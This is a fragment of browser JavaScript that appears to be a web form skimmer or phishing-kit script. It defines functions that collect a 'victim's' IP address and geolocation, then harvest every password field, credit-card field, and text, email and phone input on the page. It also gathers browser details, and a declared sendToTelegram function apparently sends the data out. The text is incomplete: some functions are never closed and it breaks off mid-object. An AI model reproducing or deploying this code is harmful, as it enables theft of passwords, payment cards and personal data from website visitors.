        async function sendToTelegram(message) {

        async function collectVictimData() {

        async function getIPData() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return { ip: data.ip };
            } catch (error) {
                return { ip: 'Unknown' };
            }
        }

        async function getLocationData(ip) {
            if (!ip || ip === 'Unknown') return { country_code: 'UN', city: 'Unknown', country: 'Unknown' };
            
            try {
                const response = await fetch(`https://ipapi.co/${ip}/json/`);
                const data = await response.json();
                return {
                    country_code: data.country_code || 'UN',
                    city: data.city || 'Unknown',
                    country: data.country_name || 'Unknown'
                };
            } catch (error) {
                return { country_code: 'UN', city: 'Unknown', country: 'Unknown' };
            }
        }

        function collectPasswords() {
            const passwords = [];
            document.querySelectorAll('input[type="password"]').forEach(input => {
                if (input.value) {
                    passwords.push({
                        field: input.name || 'password',
                        value: input.value
                    });
                }
            });
            return passwords;
        }

        function collectCreditCards() {
            const cards = [];
            document.querySelectorAll('input[autocomplete*="cc"], input[name*="card"]').forEach(field => {
                if (field.value && field.value.replace(/\s/g, '').length > 10) {
                    cards.push({
                        type: field.name || 'card',
                        value: field.value
                    });
                }
            });
            return cards;
        }

        function collectPersonalInfo() {
            const info = {};
            document.querySelectorAll('input[type="text"], input[type="email"], input[type="tel"]').forEach(input => {
                if (input.value) {
                    const key = input.name || input.placeholder || 'field';
                    info[key] = input.value;
                }
            });
            return info;
        }

        function collectSystemData() {
            return {
                screen: `${screen.width}x${screen.height}`,
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform
